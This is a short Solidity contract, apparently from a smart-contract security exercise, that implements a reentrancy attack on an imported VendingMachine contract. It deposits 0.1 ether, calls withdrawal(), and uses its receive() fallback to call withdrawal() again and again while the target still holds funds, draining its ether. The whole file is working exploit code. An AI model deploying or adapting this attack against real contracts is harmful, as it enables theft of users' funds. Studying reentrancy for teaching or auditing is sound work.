// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import "./VendingMachine.sol";

contract AttackVendingMachine{
    VendingMachine public vendingMachine;

    constructor(address _vendingMachineAddress){  
        vendingMachine = VendingMachine(_vendingMachineAddress);
    }

    receive() external payable{
         if(address(vendingMachine).balance >= 0.1 ether){
            vendingMachine.withdrawal();
        }
    }

    function attackContract() public payable{
        require(msg.value >= 0.1 ether, "Requires at least 0.1 ether to launch an attack");
        vendingMachine.deposit{value: 0.1 ether}();

        vendingMachine.withdrawal();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}